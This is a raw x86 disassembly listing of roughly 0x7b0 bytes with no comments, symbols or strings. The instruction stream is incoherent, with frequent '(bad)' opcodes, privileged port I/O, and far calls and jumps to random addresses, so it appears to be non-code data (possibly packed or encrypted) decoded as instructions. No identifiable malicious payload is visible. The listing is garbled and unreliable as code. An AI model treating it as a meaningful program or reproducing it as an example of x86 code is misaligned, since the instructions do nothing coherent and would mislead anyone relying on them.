  40a2ef:	mov    esp,DWORD PTR [eax-0x3cda211b]
  40a2f5:	loopne 0x40a2ed
  40a2f7:	cmovne ecx,DWORD PTR [ecx]
  40a2fa:	out    0xfb,al
  40a2fc:	pushf  
  40a2fd:	jg     0x40a298
  40a2ff:	cmp    esp,DWORD PTR [edi+edi*8]
  40a302:	pop    ebp
  40a303:	add    BYTE PTR [ecx+0x116690ab],al
  40a309:	call   0xb06a9df0
  40a30e:	xchg   edi,eax
  40a30f:	xchg   esp,eax
  40a310:	inc    ebx
  40a311:	(bad)  
  40a312:	mov    al,ds:0xdc3bf057
  40a317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a318:	sub    eax,0xedc0348
  40a31d:	mov    esp,0x1b82687c
  40a322:	push   0xffffffc2
  40a324:	call   0xe827:0xe6097a2e
  40a32b:	cmp    eax,0x5a358610
  40a330:	pop    edx
  40a331:	sbb    al,0x15
  40a333:	push   ebp
  40a334:	fwait
  40a335:	adc    eax,0xfc683122
  40a33a:	outs   dx,BYTE PTR ds:[esi]
  40a33b:	pop    edx
  40a33c:	push   0x9af10832
  40a341:	fs adc al,0x46
  40a344:	rol    DWORD PTR [eax],0xd7
  40a347:	add    eax,0x6c7dc7dd
  40a34c:	repz out dx,eax
  40a34e:	xor    al,0x2b
  40a350:	je     0x40a342
  40a352:	jle    0x40a36f
  40a354:	mov    eax,ds:0xca923246
  40a359:	and    BYTE PTR [eax],dl
  40a35b:	inc    ecx
  40a35c:	rcr    DWORD PTR [edi+0x3d],1
  40a35f:	add    al,0xe5
  40a361:	sub    ch,dl
  40a363:	stos   DWORD PTR es:[edi],eax
  40a364:	cmp    esi,ecx
  40a366:	(bad)  
  40a367:	shl    DWORD PTR [edi],cl
  40a369:	outs   dx,BYTE PTR ds:[esi]
  40a36a:	cwde   
  40a36b:	into   
  40a36c:	out    0x19,eax
  40a36e:	ret    
  40a36f:	(bad)
  40a372:	mov    dh,0xaf
  40a374:	mov    ecx,0x73fe55bc
  40a379:	mov    esi,0x1b970235
  40a37e:	out    dx,eax
  40a37f:	adc    ax,0x9cca
  40a383:	pusha  
  40a384:	mov    dh,0xf6
  40a386:	and    dh,BYTE PTR [ebp+0xe8e767d]
  40a38c:	inc    edi
  40a38d:	jecxz  0x40a3be
  40a38f:	push   0xe4566e57
  40a394:	jge    0x40a40f
  40a396:	mov    ds:0x3fb19494,al
  40a39b:	int    0x1a
  40a39d:	ret    0x7482
  40a3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a1:	or     eax,0x27e0c65e
  40a3a6:	cmp    al,0xc5
  40a3a8:	je     0x40a421
  40a3aa:	push   ss
  40a3ab:	mov    eax,ds:0xb406f9e
  40a3b0:	lods   al,BYTE PTR ds:[esi]
  40a3b1:	push   ecx
  40a3b2:	data16 icebp 
  40a3b4:	aaa    
  40a3b5:	dec    eax
  40a3b6:	(bad)  
  40a3b7:	loop   0x40a427
  40a3b9:	sar    BYTE PTR [esi-0x73a135dd],0x46
  40a3c0:	pop    ebp
  40a3c1:	jns    0x40a438
  40a3c3:	mov    dh,0x3b
  40a3c5:	(bad)  
  40a3c6:	and    eax,0xf6e5db
  40a3cb:	aaa    
  40a3cc:	ja     0x40a3c3
  40a3ce:	inc    edx
  40a3cf:	xchg   ebp,eax
  40a3d0:	inc    esp
  40a3d1:	popa   
  40a3d2:	aaa    
  40a3d3:	(bad)  
  40a3d4:	push   ebp
  40a3d5:	je     0x40a371
  40a3d7:	inc    esp
  40a3d8:	(bad)  
  40a3d9:	push   ss
  40a3da:	loop   0x40a381
  40a3dc:	addr16 mov cl,0x9
  40a3df:	mov    edx,0xa6250191
  40a3e4:	rcl    DWORD PTR [edx+0xa693766],0xe1
  40a3eb:	pop    es
  40a3ec:	int    0xfb
  40a3ee:	xchg   ebx,eax
  40a3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3f0:	dec    edx
  40a3f1:	sbb    DWORD PTR [edi-0x5c141329],esp
  40a3f7:	sub    DWORD PTR [esp+ebx*8+0x609bd4ff],ecx
  40a3fe:	arpl   WORD PTR [esi+0x647ec56a],sp
  40a404:	(bad)  
  40a405:	mov    bh,0xf4
  40a407:	inc    eax
  40a408:	sub    edi,DWORD PTR [ebx-0x23]
  40a40b:	and    al,0xae
  40a40d:	imul   ebp,DWORD PTR [esi],0x7c
  40a410:	out    dx,al
  40a411:	out    0xe4,eax
  40a413:	adc    DWORD PTR [esp+edi*1],eax
  40a416:	mov    ebx,0x553d85f9
  40a41b:	and    DWORD PTR [ecx+0x68a331b1],edi
  40a421:	icebp  
  40a422:	fadd   DWORD PTR [eax]
  40a424:	jecxz  0x40a3bf
  40a426:	cmc    
  40a427:	push   es
  40a428:	mov    cl,0x52
  40a42a:	ss clc 
  40a42c:	nop
  40a42d:	not    BYTE PTR [edi+0x6903ddbf]
  40a433:	(bad)  
  40a435:	mov    bl,0x81
  40a437:	leave  
  40a438:	unpcklps xmm1,XMMWORD PTR [esi+eax*4+0x52]
  40a43d:	nop
  40a43e:	ins    BYTE PTR es:[edi],dx
  40a43f:	mov    cl,0xa2
  40a441:	jmp    0x3afdb670
  40a446:	add    dh,BYTE PTR [esi+0x188d4117]
  40a44c:	xor    DWORD PTR [ecx],edi
  40a44e:	adc    DWORD PTR [ebp+0x0],edx
  40a451:	in     al,dx
  40a452:	mov    DWORD PTR [edi+0x64],esp
  40a455:	pop    ecx
  40a456:	dec    edx
  40a457:	dec    ebx
  40a458:	xchg   edx,eax
  40a459:	mov    cl,0x95
  40a45b:	sbb    esp,DWORD PTR [ebx+0xc244d03]
  40a461:	adc    eax,0xf151b45d
  40a466:	or     eax,0xbc64779c
  40a46b:	in     eax,0xa4
  40a46d:	cmp    al,0x18
  40a46f:	xor    eax,0xe11924aa
  40a474:	loopne 0x40a43e
  40a476:	cmp    eax,0xfc2bd784
  40a47b:	add    ah,BYTE PTR [edx+0x8d1b29]
  40a481:	addr16 fdiv st(0),st
  40a484:	fdivr  DWORD PTR [ebx+esi*1+0x10]
  40a488:	dec    eax
  40a489:	mov    al,ds:0xed974aea
  40a48e:	jmp    0x3125e103
  40a493:	and    al,BYTE PTR fs:[ebp+0x36]
  40a497:	lahf   
  40a498:	push   DWORD PTR [edx]
  40a49a:	push   ss
  40a49b:	fcmovbe st,st(7)
  40a49d:	mov    edx,0x99ac6eff
  40a4a2:	mov    eax,0xff5aa680
  40a4a7:	cmc    
  40a4a8:	in     eax,0x79
  40a4aa:	outs   dx,BYTE PTR ds:[esi]
  40a4ab:	pop    eax
  40a4ac:	repnz cmp eax,DWORD PTR [ebx+ecx*2]
  40a4b0:	repz es sar dl,1
  40a4b4:	push   eax
  40a4b5:	mov    al,ds:0xa670b4f
  40a4ba:	aaa    
  40a4bb:	and    ah,BYTE PTR [eax-0x60406f1e]
  40a4c1:	pushf  
  40a4c2:	rcl    BYTE PTR [edi+eiz*2+0x47c3fbd2],0xae
  40a4ca:	dec    edi
  40a4cb:	retf   0x2e93
  40a4ce:	retf   
  40a4cf:	paddsb mm0,QWORD PTR [edx+edx*4]
  40a4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d4:	sbb    ecx,DWORD PTR [esi]
  40a4d6:	jp     0x40a467
  40a4d8:	xchg   ebp,eax
  40a4d9:	call   0x5c37:0x6b694e86
  40a4e0:	sub    edi,DWORD PTR [edi]
  40a4e2:	ja     0x40a551
  40a4e4:	cmp    DWORD PTR gs:[esi+0x69],edi
  40a4e8:	mul    esp
  40a4ea:	sbb    DWORD PTR [edi+0x50],ebx
  40a4ed:	push   eax
  40a4ee:	scas   eax,DWORD PTR es:[edi]
  40a4ef:	popf   
  40a4f0:	or     eax,0x7a032be0
  40a4f5:	lahf   
  40a4f6:	(bad)  
  40a4f7:	and    BYTE PTR [ebx-0x62],al
  40a4fa:	(bad)
  40a4fd:	test   BYTE PTR [ebp+0xdfb4238],ch
  40a503:	xchg   ebp,eax
  40a504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a505:	xor    al,0x1e
  40a507:	cmp    dh,BYTE PTR [esi+0x36eaec60]
  40a50d:	xor    BYTE PTR [ebx+0x310464a0],dl
  40a513:	pop    ebp
  40a514:	jbe    0x40a57a
  40a516:	xchg   ebp,eax
  40a517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a518:	cmp    BYTE PTR [eax-0x13],al
  40a51b:	or     DWORD PTR [ecx+0x41ff71d7],ebx
  40a521:	xchg   ebx,eax
  40a522:	pusha  
  40a523:	nop
  40a524:	xchg   edx,eax
  40a525:	aaa    
  40a526:	sub    DWORD PTR [edi-0xe],ebp
  40a529:	push   cs
  40a52a:	xlat   BYTE PTR ds:[ebx]
  40a52b:	jp     0x40a513
  40a52d:	mov    ebp,0x5ebd1b9d
  40a532:	pop    es
  40a533:	dec    edx
  40a534:	stc    
  40a535:	aaa    
  40a536:	adc    al,0x37
  40a538:	add    BYTE PTR [ebx-0x7e501f5b],dl
  40a53e:	ret    
  40a53f:	adc    eax,0xbcd70df5
  40a544:	jmp    0xca4545b7
  40a549:	idiv   DWORD PTR [edi-0x26]
  40a54c:	xchg   DWORD PTR [eax+0x735900d2],edx
  40a552:	call   DWORD PTR [ebx-0xee18fb8]
  40a558:	cmp    edx,ebx
  40a55a:	pop    ecx
  40a55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a55c:	xchg   ebx,eax
  40a55d:	cmp    BYTE PTR [ecx],0xd
  40a560:	out    dx,eax
  40a561:	xor    al,0x3a
  40a563:	cli    
  40a564:	inc    ebx
  40a565:	out    0xfd,al
  40a567:	addr16 in al,dx
  40a569:	aas    
  40a56a:	data16 lods al,BYTE PTR ds:[esi]
  40a56c:	mov    dl,0x9d
  40a56e:	popa   
  40a56f:	push   ss
  40a570:	cld    
  40a571:	xchg   edx,eax
  40a572:	(bad)  
  40a573:	retf   
  40a574:	mov    cl,BYTE PTR [edi+0x5a40f1ca]
  40a57a:	dec    ebx
  40a57b:	mov    bh,0x33
  40a57d:	cmp    BYTE PTR [esp+edi*4+0x7911e74e],ch
  40a584:	fiadd  DWORD PTR [ebx-0x66abdb76]
  40a58a:	pop    ss
  40a58b:	fadd   st(7),st
  40a58d:	ins    BYTE PTR es:[edi],dx
  40a58e:	sub    edi,DWORD PTR [ebx+ecx*1]
  40a591:	scas   eax,DWORD PTR es:[edi]
  40a592:	push   0x97410c7
  40a597:	fs sbb eax,0x9b63c21
  40a59d:	lea    esi,[eax+edx*4]
  40a5a0:	cld    
  40a5a1:	xchg   ah,al
  40a5a3:	jmp    0x40a5ef
  40a5a5:	int    0xd9
  40a5a7:	int    0x88
  40a5a9:	sbb    dh,bl
  40a5ab:	dec    ecx
  40a5ac:	pop    ss
  40a5ad:	xchg   ebp,eax
  40a5ae:	mov    esp,0x7676b905
  40a5b3:	sahf   
  40a5b4:	jo     0x40a5f9
  40a5b6:	inc    edx
  40a5b7:	mov    BYTE PTR [edx],bh
  40a5b9:	cmp    eax,0x86567106
  40a5be:	cmc    
  40a5bf:	out    dx,al
  40a5c0:	cs shl cl,0x6f
  40a5c4:	loopne 0x40a594
  40a5c6:	out    dx,eax
  40a5c7:	iret   
  40a5c8:	push   ebp
  40a5c9:	fdivr  DWORD PTR [ebx]
  40a5cb:	push   ecx
  40a5cc:	mov    bh,0x1b
  40a5ce:	xchg   ebx,eax
  40a5cf:	mov    DWORD PTR [edi-0x52],esp
  40a5d2:	add    al,0x7c
  40a5d4:	dec    esp
  40a5d5:	sbb    eax,0x8bad09bd
  40a5da:	jbe    0x40a57f
  40a5dc:	call   0xcfc2:0x29bdd7ad
  40a5e3:	test   DWORD PTR [edi-0x6bc7a7fb],0xac1135ba
  40a5ed:	inc    esi
  40a5ee:	xchg   edi,eax
  40a5ef:	jae    0x40a5e1
  40a5f1:	adc    ah,BYTE PTR [edx-0x163cb6f0]
  40a5f7:	pop    ecx
  40a5f8:	daa    
  40a5f9:	ror    DWORD PTR [eax+eax*4+0xbd19da7],1
  40a600:	ds mov edi,eax
  40a603:	clc    
  40a604:	jnp    0x40a5c0
  40a606:	and    BYTE PTR [eax],dh
  40a608:	pop    edi
  40a609:	in     eax,0xb1
  40a60b:	push   cs
  40a60c:	push   ebx
  40a60d:	sub    esp,ebp
  40a60f:	fimul  WORD PTR [edi-0x57]
  40a612:	bound  esp,QWORD PTR [edi]
  40a614:	sub    BYTE PTR [ebx],dh
  40a616:	pop    ds
  40a617:	addr16 push ss
  40a619:	mov    ah,0x7
  40a61b:	mov    ds:0x611586ea,eax
  40a620:	test   BYTE PTR [ebx],dl
  40a622:	cmp    BYTE PTR ds:0xbd845365,ah
  40a628:	xchg   edx,eax
  40a629:	mov    ebx,0xa9e9013f
  40a62e:	mov    edx,0x386f9a07
  40a633:	ss cmp bl,ah
  40a636:	and    dh,dh
  40a638:	js     0x40a650
  40a63a:	jl     0x40a5f3
  40a63c:	pop    ds
  40a63d:	jecxz  0x40a616
  40a63f:	cmp    ah,dl
  40a641:	pop    ds
  40a642:	ds enter 0xdb53,0x6a
  40a647:	jmp    0xb250:0xbcdc3602
  40a64e:	adc    edi,DWORD PTR [edx+0x7b]
  40a651:	mov    bh,0x6c
  40a653:	stc    
  40a654:	inc    esp
  40a655:	xor    dh,cl
  40a657:	cmp    BYTE PTR [esi],dh
  40a659:	jno    0x40a5dc
  40a65b:	call   0x35bf9c56
  40a660:	add    bh,bh
  40a662:	in     al,0x1d
  40a664:	jg     0x40a652
  40a666:	or     BYTE PTR [edx+0x68],dl
  40a669:	leave  
  40a66a:	lods   al,BYTE PTR ds:[esi]
  40a66b:	ja     0x40a64a
  40a66d:	dec    eax
  40a66e:	ja     0x40a69b
  40a670:	or     ch,BYTE PTR [ecx-0x50]
  40a673:	adc    al,0x93
  40a675:	dec    eax
  40a676:	jbe    0x40a6cb
  40a678:	mov    bh,0xd4
  40a67a:	cmp    DWORD PTR [esi-0x37],ebp
  40a67d:	shr    BYTE PTR [ebp+0x5d3d9688],cl
  40a683:	jmp    0x22a:0xc94ce1e9
  40a68a:	mov    ds:0xbf3d05b1,al
  40a68f:	cmp    al,0xb8
  40a691:	js     0x40a70f
  40a693:	(bad)  
  40a694:	cmp    eax,0x18ae1225
  40a699:	daa    
  40a69a:	pop    esp
  40a69b:	and    esp,DWORD PTR [esp+eiz*8-0x5b]
  40a69f:	pop    es
  40a6a0:	xor    BYTE PTR [eax],al
  40a6a2:	adc    DWORD PTR [ecx+0x155880ca],ebx
  40a6a8:	dec    edx
  40a6a9:	jb     0x40a636
  40a6ab:	loopne 0x40a6ab
  40a6ad:	call   0x3e48:0xdf5fc645
  40a6b4:	(bad)  [ebx+0x67ae791a]
  40a6ba:	mov    ch,0x4b
  40a6bc:	and    bh,BYTE PTR [ebx-0x2e]
  40a6bf:	xchg   esp,eax
  40a6c0:	mov    esp,0x54839196
  40a6c5:	repz pop ds
  40a6c7:	pop    esi
  40a6c8:	cmp    dh,ah
  40a6ca:	sbb    eax,0x11b08846
  40a6cf:	mov    eax,ds:0x7e3ee166
  40a6d4:	rol    BYTE PTR [eax+0x62312b27],cl
  40a6da:	mov    eax,ds:0xf3824510
  40a6df:	imul   ebx,esp,0xd9a297e9
  40a6e5:	inc    ebp
  40a6e6:	cs mov bl,0x49
  40a6e9:	sub    DWORD PTR [esi],ebx
  40a6eb:	fst    QWORD PTR [esi]
  40a6ed:	mov    ah,0x97
  40a6ef:	dec    eax
  40a6f0:	daa    
  40a6f1:	fdivrp st(3),st
  40a6f3:	inc    ecx
  40a6f4:	(bad)  
  40a6f5:	not    BYTE PTR [ecx+0x6c]
  40a6f8:	xchg   al,al
  40a6fa:	mov    ah,0x4d
  40a6fc:	out    0x5b,eax
  40a6fe:	fs sub eax,0x93a7c4f8
  40a704:	cmp    ecx,esi
  40a706:	imul   BYTE PTR [edx+0x1415dc8a]
  40a70c:	call   0x1d77592
  40a711:	sbb    BYTE PTR [eax+0x66],bh
  40a714:	lods   eax,DWORD PTR ds:[esi]
  40a715:	mov    edx,ebp
  40a717:	aaa    
  40a718:	in     eax,0xa9
  40a71a:	mov    ebp,0xb59b3b3e
  40a71f:	mov    ss:0x442119d4,al
  40a725:	bound  edi,QWORD PTR [ebx-0x1e]
  40a728:	xchg   esp,eax
  40a729:	in     al,dx
  40a72a:	jecxz  0x40a75d
  40a72c:	mov    ebp,0x388a929d
  40a731:	fimul  DWORD PTR [eax*4-0x7eaa51d8]
  40a738:	or     DWORD PTR [ebp+0x1],eax
  40a73b:	mov    edx,0xfe5a288
  40a740:	xchg   ebp,eax
  40a741:	les    ecx,FWORD PTR [eax+0x6dda88e]
  40a747:	push   edi
  40a748:	call   0x31dc0eca
  40a74d:	pavgb  mm2,mm1
  40a750:	jne    0x40a794
  40a752:	mov    bl,0x80
  40a754:	push   edi
  40a755:	mov    eax,ds:0xec7f1fdd
  40a75a:	push   edx
  40a75b:	and    BYTE PTR [edi-0x3adf991f],0x42
  40a762:	add    ebx,0xffffffd7
  40a765:	and    dx,WORD PTR ss:[eax]
  40a769:	push   edi
  40a76a:	jns    0x40a709
  40a76c:	idiv   BYTE PTR [ebx+0x668d0c6a]
  40a772:	pop    ss
  40a773:	out    dx,eax
  40a774:	fwait
  40a775:	add    eax,0xd51bdf0f
  40a77a:	ja     0x40a794
  40a77c:	(bad)  
  40a77d:	mov    DWORD PTR [ebp+0x5177c7c3],esi
  40a783:	ins    DWORD PTR es:[edi],dx
  40a784:	ins    DWORD PTR es:[edi],dx
  40a785:	sbb    eax,0xcea4a244
  40a78a:	push   ds
  40a78b:	add    eax,0xae12840c
  40a790:	cld    
  40a791:	loopne 0x40a76a
  40a793:	inc    ecx
  40a794:	repz sahf 
  40a796:	jno    0x40a797
  40a798:	push   esp
  40a799:	cli    
  40a79a:	fdiv   DWORD PTR [ecx+0x7d90247e]
  40a7a0:	inc    ebx
  40a7a1:	mov    DWORD PTR [eax+0x5a],0x1924d5d6
  40a7a8:	mov    cl,0xfa
  40a7aa:	and    edx,edx
  40a7ac:	adc    BYTE PTR [ecx+0x677393c6],0x23
  40a7b3:	xor    BYTE PTR [esi+eax*8-0x24],bl
  40a7b7:	and    edx,DWORD PTR [eax-0x51]
  40a7ba:	leave  
  40a7bb:	mov    ecx,0x6a3d926b
  40a7c0:	mov    esp,0x38e7cf41
  40a7c5:	push   ebp
  40a7c6:	mov    ah,0xc5
  40a7c8:	rcr    DWORD PTR [esi+0x3ec098d5],1
  40a7ce:	into   
  40a7cf:	mov    eax,0xe9a9b97e
  40a7d4:	popf   
  40a7d5:	loopne 0x40a7ff
  40a7d7:	sub    al,0x4f
  40a7d9:	ror    DWORD PTR [ebp+0x34004db7],0xaf
  40a7e0:	bound  esp,QWORD PTR [ecx]
  40a7e2:	xor    BYTE PTR [edi],al
  40a7e4:	(bad)  
  40a7e5:	jnp    0x40a822
  40a7e7:	test   DWORD PTR [ecx-0x4b7a4149],eax
  40a7ed:	fld    DWORD PTR [ebp+0x78]
  40a7f0:	adc    ebp,ecx
  40a7f2:	scas   eax,DWORD PTR es:[edi]
  40a7f3:	jp     0x40a776
  40a7f5:	inc    ebp
  40a7f6:	xlat   BYTE PTR ds:[ebx]
  40a7f7:	sbb    eax,0xa03528d3
  40a7fc:	les    eax,FWORD PTR [eax-0x47]
  40a7ff:	mov    ch,0x59
  40a801:	aad    0x12
  40a803:	xchg   esp,eax
  40a804:	sti    
  40a805:	xor    al,0xb8
  40a807:	mov    esp,0xc1517ca2
  40a80c:	fadd   QWORD PTR [edx]
  40a80e:	or     bh,ch
  40a810:	nop
  40a811:	(bad)  ds:0x77198078
  40a817:	dec    ecx
  40a818:	add    BYTE PTR [ecx],ah
  40a81a:	data16 mov bl,0xdd
  40a81d:	out    dx,al
  40a81e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a81f:	scas   eax,DWORD PTR es:[edi]
  40a820:	outs   dx,DWORD PTR ds:[esi]
  40a821:	in     eax,dx
  40a822:	les    ebx,FWORD PTR [ebx+0x35]
  40a825:	inc    eax
  40a826:	ds jg  0x40a827
  40a829:	sti    
  40a82a:	mov    dh,BYTE PTR [ecx+0x22975b61]
  40a830:	push   ss
  40a831:	xor    DWORD PTR [edi-0x76c220b5],0x1e21ae8
  40a83b:	cmc    
  40a83c:	dec    edi
  40a83d:	pop    eax
  40a83e:	fmul   DWORD PTR [esi]
  40a840:	lahf   
  40a841:	sub    al,0xfd
  40a843:	mov    ch,0x21
  40a845:	sub    eax,0x9a3bd8c6
  40a84a:	loopne 0x40a841
  40a84c:	in     al,dx
  40a84d:	bound  esi,QWORD PTR [ebp+0x2c03d7bc]
  40a853:	ss dec ecx
  40a855:	add    al,0x60
  40a857:	pop    ebx
  40a858:	wrmsr  
  40a85a:	fcomp  DWORD PTR [edx]
  40a85c:	dec    edi
  40a85d:	enter  0x8195,0xb0
  40a861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a862:	push   ecx
  40a863:	xchg   ch,ch
  40a865:	imul   ebx,DWORD PTR [edi+eax*2+0x54dff539],0x63564f94
  40a870:	ins    BYTE PTR es:[edi],dx
  40a871:	jg     0x40a8a9
  40a873:	fs cs dec ebp
  40a876:	xchg   DWORD PTR [ecx],ebp
  40a878:	push   es
  40a879:	sub    al,0x1c
  40a87b:	clc    
  40a87c:	xchg   ecx,eax
  40a87d:	shr    esp,1
  40a87f:	daa    
  40a880:	jg     0x40a86d
  40a882:	inc    ecx
  40a883:	pop    ebp
  40a884:	mov    eax,edi
  40a886:	sbb    al,0x1c
  40a888:	int    0x37
  40a88a:	retf   
  40a88b:	outs   dx,DWORD PTR ds:[esi]
  40a88c:	out    dx,al
  40a88d:	loopne 0x40a88f
  40a88f:	lea    esp,[ebp+0x21]
  40a892:	out    0xa4,al
  40a894:	push   ecx
  40a895:	mov    ebx,0x8a3bfa5a
  40a89a:	sub    DWORD PTR [edi],edi
  40a89c:	pusha  
  40a89d:	inc    esp
  40a89e:	add    ecx,DWORD PTR [eax+0x12]
  40a8a1:	pmaxub mm2,QWORD PTR [ebx-0x3e32ea23]
  40a8a8:	stc    
  40a8a9:	and    DWORD PTR [ebx],edi
  40a8ab:	and    eax,0xa1520403
  40a8b0:	mov    ecx,0x2b2e1160
  40a8b5:	retf   0xd5ba
  40a8b8:	or     eax,0xabee13fd
  40a8bd:	jo     0x40a91a
  40a8bf:	cs mov ecx,0xdef944fc
  40a8c5:	ficom  DWORD PTR [esi]
  40a8c7:	adc    BYTE PTR [ebx+ebp*8+0x750e34f5],dl
  40a8ce:	sub    ebx,ebx
  40a8d0:	cmp    BYTE PTR [ebx+ecx*2+0x204ae037],ah
  40a8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d8:	pop    eax
  40a8d9:	mov    edx,0xf6b04c16
  40a8de:	jmp    0x73bb:0x7d1b8fb2
  40a8e5:	mov    cl,BYTE PTR ds:0x2024d611
  40a8eb:	(bad)  
  40a8ec:	jmp    0x28a43f79
  40a8f1:	and    eax,0x85ef9386
  40a8f6:	jb     0x40a92a
  40a8f8:	scas   eax,DWORD PTR es:[edi]
  40a8f9:	ror    BYTE PTR [edi-0x10b1e0d3],1
  40a8ff:	cmc    
  40a900:	xor    esp,ebp
  40a902:	pop    ebp
  40a903:	repnz stc 
  40a905:	sub    ecx,DWORD PTR [ecx-0x5c]
  40a908:	gs out 0x58,al
  40a90b:	cmp    edx,DWORD PTR ds:0xf51c7adc
  40a911:	sar    DWORD PTR [eax+eax*4],cl
  40a914:	(bad)  
  40a915:	call   0x615e88f1
  40a91a:	lahf   
  40a91b:	dec    esp
  40a91c:	inc    esi
  40a91d:	dec    eax
  40a91e:	(bad)  
  40a91f:	jge    0x40a93a
  40a921:	add    edx,DWORD PTR [esi+0x5452747e]
  40a927:	sbb    BYTE PTR [esi+0x68],bl
  40a92a:	cs in  al,0x95
  40a92d:	(bad)  
  40a92e:	retf   
  40a92f:	inc    eax
  40a930:	sbb    eax,0x6f7b4974
  40a935:	loope  0x40a97a
  40a937:	ret    0x44e0
  40a93a:	outs   dx,DWORD PTR ds:[esi]
  40a93b:	push   eax
  40a93c:	push   0xfffffff9
  40a93e:	ret    
  40a93f:	push   ds
  40a940:	shl    BYTE PTR [ecx],cl
  40a942:	mov    cl,0xeb
  40a944:	ja     0x40a973
  40a946:	xchg   ecx,eax
  40a947:	daa    
  40a948:	daa    
  40a949:	(bad)
  40a94d:	repnz or BYTE PTR [ebp-0x4cabc034],ah
  40a954:	ds loop 0x40a905
  40a957:	les    edx,FWORD PTR [edx+0x60edb5d5]
  40a95d:	push   ds
  40a95e:	inc    esp
  40a95f:	cmp    eax,0xbe2a09e4
  40a964:	(bad)  
  40a965:	in     eax,dx
  40a966:	mov    esp,0x4d945bbc
  40a96b:	rcr    DWORD PTR [ebx+eax*4],cl
  40a96e:	adc    ch,BYTE PTR [edx-0x40]
  40a971:	sub    esp,DWORD PTR [edx]
  40a973:	sbb    DWORD PTR [eax-0x408b4503],edi
  40a979:	lahf   
  40a97a:	dec    esi
  40a97b:	mov    al,0xea
  40a97d:	in     eax,dx
  40a97e:	bound  eax,QWORD PTR [edx+0x3ae3fea0]
  40a984:	int    0x39
  40a986:	mov    eax,ds:0x31c12671
  40a98b:	and    eax,0x210c0570
  40a990:	pop    ecx
  40a991:	dec    ecx
  40a992:	jp     0x40a925
  40a994:	and    BYTE PTR ds:0x2de9bd62,ah
  40a99a:	popa   
  40a99b:	sbb    al,0x96
  40a99d:	shl    BYTE PTR [ebx-0x66],1
  40a9a0:	mov    fs,WORD PTR [eax+0x2]
  40a9a3:	jmp    FWORD PTR [ebp+0x12]
  40a9a6:	mov    eax,0x9a7ddea0
  40a9ab:	outs   dx,DWORD PTR ds:[esi]
  40a9ac:	and    eax,0x546ebabd
  40a9b1:	push   edi
  40a9b2:	retf   0x795e
  40a9b5:	scas   eax,DWORD PTR es:[edi]
  40a9b6:	dec    eax
  40a9b7:	stc    
  40a9b8:	sub    BYTE PTR [esi-0x5ad442d0],0xea
  40a9bf:	add    DWORD PTR [ecx-0x421f50af],edi
  40a9c5:	sahf   
  40a9c6:	cmp    BYTE PTR [ebp-0x75],ch
  40a9c9:	fs leave 
  40a9cb:	stc    
  40a9cc:	shr    BYTE PTR [ebx+0x58f33be7],1
  40a9d2:	ret    
  40a9d3:	scas   al,BYTE PTR es:[edi]
  40a9d4:	push   esp
  40a9d5:	daa    
  40a9d6:	adc    eax,eax
  40a9d8:	ins    DWORD PTR es:[edi],dx
  40a9d9:	test   eax,0xead6e4e5
  40a9de:	aam    0xc1
  40a9e0:	sbb    DWORD PTR [ebx-0x21],ecx
  40a9e3:	out    0xe,al
  40a9e5:	add    eax,0x1c696340
  40a9ea:	cmp    al,0xbe
  40a9ec:	sar    dl,0x5e
  40a9ef:	mov    BYTE PTR [eax+0x1ca81a02],0x30
  40a9f6:	out    0xa8,al
  40a9f8:	rcl    edx,0x70
  40a9fb:	in     eax,dx
  40a9fc:	pop    esi
  40a9fd:	popa   
  40a9fe:	mov    ebx,0x303d4736
  40aa03:	xor    esp,ebx
  40aa05:	sbb    edi,ecx
  40aa07:	mov    bl,0x62
  40aa09:	ins    BYTE PTR es:[edi],dx
  40aa0a:	aas    
  40aa0b:	inc    esi
  40aa0c:	pop    ebx
  40aa0d:	or     ebp,ebx
  40aa0f:	mov    edi,0x2a61c230
  40aa14:	cmp    bh,dl
  40aa16:	pusha  
  40aa17:	mov    ebp,0xbfb8be4
  40aa1c:	mov    bh,0x82
  40aa1e:	add    ecx,ecx
  40aa20:	mov    eax,0x30df21f7
  40aa25:	arpl   WORD PTR [esi+0x4e687e79],ax
  40aa2b:	adc    al,0xa5
  40aa2d:	js     0x40a9b4
  40aa2f:	retf   
  40aa30:	and    eax,0x82c75d90
  40aa35:	jnp    0x40aa7d
  40aa37:	shr    BYTE PTR [edi+0x7d],0xb4
  40aa3b:	mov    eax,ds:0x62d5b909
  40aa40:	test   BYTE PTR [ebx+0x36],dh
  40aa43:	cdq    
  40aa44:	rcr    eax,cl
  40aa46:	sub    ebx,ebp
  40aa48:	pop    ebx
  40aa49:	push   ebp
  40aa4a:	pop    ds
  40aa4b:	jmp    0x689bd4c6
  40aa50:	jl     0x40aa05
  40aa52:	shl    BYTE PTR [ebx-0x51],0x12
  40aa56:	mov    esp,0x4f08e08c
  40aa5b:	das    
  40aa5c:	sti    
  40aa5d:	(bad)  
  40aa5e:	enter  0xc312,0xa9
  40aa62:	inc    edi
  40aa63:	and    BYTE PTR [ebx],0xc6
  40aa66:	inc    ecx
  40aa67:	fcomp  QWORD PTR es:[ecx]
  40aa6a:	xchg   ebp,eax
  40aa6b:	cli    
  40aa6c:	push   es
  40aa6d:	das    
  40aa6e:	sbb    BYTE PTR [ecx],dh
  40aa70:	(bad)  
  40aa71:	div    ch
  40aa73:	xchg   BYTE PTR [ebp-0x3e6d79d1],bh
  40aa79:	ret    0xeaf5
  40aa7c:	(bad)  
  40aa7d:	ss iret 
  40aa7f:	call   DWORD PTR [eax+0x7]
  40aa82:	(bad)  
  40aa83:	sub    eax,0x425970d4
  40aa88:	cmc    
  40aa89:	push   esp
  40aa8a:	loope  0x40aaec
  40aa8c:	jmp    0x40aa9d
  40aa8e:	xchg   DWORD PTR [esi-0x11a1a0d3],ecx
  40aa94:	jbe    0x40aa67
  40aa96:	xor    BYTE PTR [ecx],bh
  40aa98:	cld    
  40aa99:	mov    al,ds:0xdd6ba7c8
  40aa9e:	xchg   ecx,eax
  40aa9f:	out    0xaa,eax
  40aaa1:	icebp  
  40aaa2:	jo     0x40ab17
